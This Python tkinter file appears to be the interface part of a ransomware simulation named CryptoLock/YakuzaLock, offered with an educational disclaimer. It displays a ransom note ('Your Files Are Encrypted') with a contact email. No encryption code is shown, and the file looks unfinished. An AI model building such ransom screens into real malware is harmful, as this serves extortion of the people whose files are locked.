"""Ransom Tools
Main GUI Layout of CryptoLock
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""
# Step 1: Import Requires Modules
import sys
import os
import tkinter as tk
from tkinter import messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk
from datetime import datetime, timedelta

# Step 2.1: Defining Function to load the current path of this python file and join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return os.path.join(basePath, relative_path)

# Define Global Constants
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank_you.png")



#Step 3: Create Main Class of Decryptor App
class DecryptorApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.iconbitmap(ICON_PATH)
        self.title("YakuzaLock")
        self.configure(bg='black')
        self.geometry("900x800")
        self.initialize_ui()

    # Step 4: Create Function to Initialize UI Components
    def initialize_ui(self):
        logoImage = Image.open(LOGO_PATH).resize((200, 200))
        logoPhoto = ImageTk.PhotoImage(logoImage)

        # Frame to hold Logo and Text
        frame = tk.Frame(self, bg='black')
        frame.pack(pady=(20, 20))

        # Logo Label with Adjust Padding
        # noinspection PyTypeChecker
        logoLabel = tk.Label(frame, image=logoPhoto, bg='black')
        logoLabel.image = logoPhoto
        logoLabel.pack(side=tk.LEFT, padx=(20, 10))

        # Step 5: Write Ransomware Notes
        ransomNotes = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
| Attention: Your Files Are Encrypted | \n\n
This simulation is solely for educational purposes and must not be used maliciously.
Users are fully accountable for their actions.
Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key. \n\n
=> To Recover Your Files <= \n
Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
        # Creating text widget for the ransomeNotes
        ransomNoteLabel = tk.Text(frame, bg='black', font=('Helvetica CE', 12), wrap='word', height=16, width=60, borderwidth=0)
        ransomNoteLabel.pack(side=tk.LEFT, padx=(10, 20))

        # Creating the text with suitable tags
        ransomNoteLabel.insert(tk.END, " Proof of Concept: Yakuza Ransomware Simulation \n", "center_red")


# Step 9: Running the Program
if __name__ == "__main__":
    app = DecryptorApp()
    app.mainloop()

















